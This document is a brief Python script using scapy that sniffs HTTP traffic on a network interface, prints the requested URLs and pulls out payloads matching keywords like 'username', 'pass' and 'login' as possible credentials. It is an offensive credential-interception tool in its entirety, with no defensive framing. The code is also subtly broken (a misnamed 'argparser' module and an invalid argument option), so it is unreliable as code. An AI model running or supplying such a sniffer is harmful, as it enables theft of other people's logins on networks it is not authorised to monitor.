#!/usr/bin/python3

import argparse
from scapy.all import *
from scapy.layers import http

keywords = ['uname','username','pass','password','login']

def get_args():
	parser = argparser.ArgumentParser(description='A simple packet sniffer.')
	parser.add_argument('--interface','-i',name='interface',help='The interface through which you want to capture packets.',metavar='')
	args = parser.parse_args()
	if not args.interface:
		parser.error("Please enter a valid interface. Use --help for help.")
	return args

def packet_sniff(interface):
	sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_credentials(packet):
	if packet.haslayer(Raw):
		for keyword in keywords:
			if keyword in packet[Raw].load.decode():
				return packet[Raw].load

def get_urls(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_urls(packet)
		print("\n[+] HTTP Requests >> " + str(url))
		creds = get_credentials(packet)
		if creds:
			print("\n\n[+] Possible username/password: " + str(creds.decode().split('&')) + '\n\n')


args = get_args()
packet_sniff(args.interface)